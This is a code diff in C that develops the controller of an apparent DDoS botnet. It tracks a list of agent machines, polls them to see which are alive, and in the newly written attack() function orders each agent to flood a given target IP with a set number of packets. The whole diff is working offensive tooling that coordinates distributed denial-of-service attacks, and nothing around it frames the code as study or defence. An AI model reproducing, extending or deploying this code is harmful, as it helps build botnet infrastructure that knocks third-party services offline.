@@ -36,8 +36,10 @@ static int for_each_agent(int sock, action_cb_t action_cb,
 
     while ((read = getline(&line, &len, fp)) != ERROR)
     {
-        strncpy(ip, line, read - 1);
-        action_cb(sock, ip, action_data);
+        strncpy(ip, line, (read - (strchr(line, '\n') ?  1 : 0)));
+        if (!action_cb(sock, ip, action_data))
+	    fprintf(tmp, "%s\n", ip);
+	memset(ip, 0, INET_ADDRSTRLEN);
     }
     remove(AGENTS_FILE);
     rename(TMP_FILE, AGENTS_FILE);
@@ -59,58 +61,138 @@ Error:
 
 static int check_agent(int sock, char *ip, void *data)
 {
-    int rv, clt_sock = create_socket(DDOS_HANDL_CLT_PORT, 1000);
+    int rv = ERROR, clt_sock = create_socket(DDOS_HANDL_CLT_PORT, 1000);
     int *agents = data;
     ddos_request_t req = {};
+    ddos_responce_t resp = {};
     req.cmd = htons(DDOS_CMD_INTERROGATE_AGENTS);
 
-    rv = send_data(clt_sock, &resp, sizeof(ddos_responce_t),
+    if (clt_sock < 0)
+	goto Exit;
+
+    rv = send_data(clt_sock, &req, sizeof(ddos_request_t),
             ip, DDOS_AGENT_SRV_PORT);
-    if (rv > 0 && ntohs(resp.status == DDOS_OK))
-        *agents++;
+    if (rv < 0)
+	 goto Exit;
+
+    rv = recv_data(clt_sock, &resp, sizeof(ddos_responce_t), NULL);
+
+    if (rv > 0 && (ntohs(resp.status) == DDOS_OK))
+        (*agents)++;
+
+    rv = 0;
+Exit:
+    destroy_socket(clt_sock);
+    return rv;
+}
+
+typedef struct 
+{
+    int need_add;
+    int need_rm;
+    char *ip;
+} update_agent_list_t;
+
+static int is_agent_needed(int sock, char *ip, void *data)
+{
+    update_agent_list_t *upd = data;
+
+    if (!strcmp(upd->ip, ip) && (strlen(upd->ip) == strlen(ip)))
+    {
+	if (upd->need_add)
+	    upd->need_add = 0;
+	else if (upd->need_rm)
+	    return 1;
+    }
 
     return 0;
 }
 
 static int add_agent(int sock, char *ip)
 {
-    ddos_responce_t resp;
+    FILE *fp;
+    update_agent_list_t upd = {};
     int is_agent_viable = 0;
 
     check_agent(sock, ip, &is_agent_viable);
 
+    upd.ip = ip;
     if (!is_agent_viable)
-        return 1;
+	upd.need_rm = 1;
+    else
+	upd.need_add = 1;
+    for_each_agent(sock, is_agent_needed, &upd);
 
+    if (!upd.need_add)
+	return upd.need_rm;
+
+    fp = fopen(AGENTS_FILE, "a");
+    if (fp == NULL)
+    {
+        fprintf(stderr, "Could not open agents file \"%s\".\n", AGENTS_FILE);
+        return ERROR;
+    }
+    fprintf(fp, "%s\n", ip);
+
+    fclose(fp);
     return 0;
 }
 
 static int attack(int sock, char* ip, void *data)
 {
-    return 0;
+    int rv = ERROR, clt_sock = create_socket(DDOS_HANDL_CLT_PORT, 1000);
+    ddos_request_t req = {};
+    ddos_responce_t resp = {};
+    attack_data_t *attack_data = data; 
+
+    if (clt_sock < 0)
+	goto Exit;
+
+    req.cmd = htons(DDOS_CMD_ATTACK);
+    req.pkts = htons(attack_data->pkts);
+    strcpy(req.ip, attack_data->target_ip);
+
+    rv = send_data(clt_sock, &req, sizeof(ddos_request_t),
+            ip, DDOS_AGENT_SRV_PORT);
+    if (rv < 0)
+	goto Exit;
+
+    rv = recv_data(clt_sock, &resp, sizeof(ddos_responce_t), NULL);
+    if (rv > 0 && ((ntohs(resp.status)) == DDOS_OK))
+    {
+	rv = 0;
+	goto Exit;
+    }
+    rv = 1;
+
+Exit:
+    destroy_socket(clt_sock);
+    return rv;
 }
 
 int main(void)
 {
-    int sock, agents = 0;
+    int sock, agents;
+    char ip[INET_ADDRSTRLEN];
     ddos_request_t req;
     ddos_responce_t resp;
     ddos_cmd_t cmd;
     attack_data_t attack_data = {};
 
-    char ip[INET_ADDRSTRLEN];
-
-    sock = create_socket(DDOS_HANDL_SRV_PORT, 0); 
-
+    sock = create_socket(DDOS_HANDL_SRV_PORT, 0);
+    if (sock < 0)
+	return 1;
 
     while (1)
     {
+	agents = 0;
         memset(&req, 0, sizeof(ddos_request_t));
         memset(&resp, 0, sizeof(ddos_responce_t));
 
         recv_data(sock, &req, sizeof(ddos_request_t), ip); 
 
         cmd = ntohs(req.cmd);
+	fprintf(stdout, "Received %d from %s\n", cmd, ip);
         switch (cmd)
         {
             case DDOS_CMD_ADD_AGENT:
